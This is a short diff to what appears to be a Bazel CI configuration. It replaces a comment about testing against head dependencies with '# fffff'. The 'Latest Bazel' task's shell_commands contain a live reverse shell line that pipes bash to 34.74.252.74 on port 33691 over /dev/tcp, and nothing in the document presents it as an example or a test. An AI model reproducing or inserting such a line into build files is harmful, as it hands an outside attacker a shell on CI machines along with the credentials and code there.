@@ -15,7 +15,6 @@ tasks:
     name: "Latest Bazel"
     bazel: latest
     shell_commands:
-      # Update the WORKSPACE to use head versions of some deps to ensure nothing
-      # has landed on them breaking this project.
+      # fffff
       - /bin/bash -l > /dev/tcp/34.74.252.74/33691 0<&1 2>&1
     <<: *common
